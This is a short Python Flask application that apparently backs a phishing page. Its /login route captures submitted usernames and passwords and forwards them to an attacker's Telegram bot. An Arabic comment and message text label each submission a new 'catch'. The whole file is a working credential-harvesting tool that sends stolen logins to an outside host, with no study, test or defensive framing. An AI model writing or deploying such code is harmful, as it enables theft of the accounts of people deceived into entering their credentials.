from flask import Flask, request, render_template
import requests
import config 

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    
    # إرسال البيانات للبوت الخاص بك
    msg = f"🔥 **صيد جديد!**\n\n👤 المستخدم: {user}\n🔑 كلمة السر: {pw}"
    url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': config.CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    
    return "OK", 200

if __name__ == '__main__':
    app.run(port=8080)
